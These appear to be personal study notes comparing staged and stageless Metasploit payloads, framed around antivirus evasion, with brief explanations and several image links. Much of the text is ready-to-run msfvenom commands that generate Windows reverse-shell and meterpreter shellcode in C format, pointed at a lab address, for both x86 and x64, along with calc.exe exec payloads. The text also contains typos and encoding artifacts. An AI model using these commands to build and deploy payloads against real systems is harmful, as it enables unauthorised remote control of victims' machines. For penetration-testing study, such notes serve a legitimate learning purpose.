# stageless vs staged
```
Itâ€™s a facinating topic when it comes to AV evasion, It brings up the old argument of "Is it better to have more network-based artifacts or host-based?".

Stageless => produced more host based artifacts.
Staged => Produces more network based artifacts.
```
###### 1-stageless
![[Pasted image 20240420103944.png]]
```
---------------------------------------------------------------
                 /shell_reverse_tcp
                 /meterpreter_reverse_tcp
---------------------------------------------------------------
A stagless payload contains everything in it. Because of this, it size is typically much larger and the program is relatively complex compared to a staged payload.
```
msfvenom!!!
```sh
###reverse tcp
msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=192.168.52.128 LPORT=9999 -f c
###meterpreter
msfvenom -a x86 --platform windows -p windows/meterpreter_reverse_tcp  LHOST=192.168.52.128 LPORT=9999 -f c
```

###### 2-staged
![[Pasted image 20240420104045.png]]
```
---------------------------------------------------------------
                 /shell/reverse_tcp
                 /meterpreter/reverse_tcp
---------------------------------------------------------------
In the diagram above, The victim runs the dropper(First Part), which beacons out to the attacker's C2 server to recieve a second stage which is then injected and executed in memory.
=> This is how staged payload works, the idea to get here is that a staged payload has multiple parts.
```
msfvenom!!!
```sh
###reverse tcp
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=192.168.52.128 LPORT=9999 -f c
###meterpreter
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp  LHOST=192.168.52.128 LPORT=9999 -f c
```
###### 3-arch
```sh
msfvenom -a x64 --platform windows -p windows/x64/exec cmd=calc.exe  -f c
```
![[Pasted image 20240420105536.png]]
```sh
msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe  -f c
```
![[Pasted image 20240420105739.png]]
```sh
msfvenom -a x64 --platform windows -p windows/x64/shell_reverse_tcp LHOST=192.168.52.128 LPORT=9999 -f c
```
![[Pasted image 20240420110832.png]]
```sh
msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=192.168.52.128 LPORT=9999 -f c
```
![[Pasted image 20240420110938.png]]
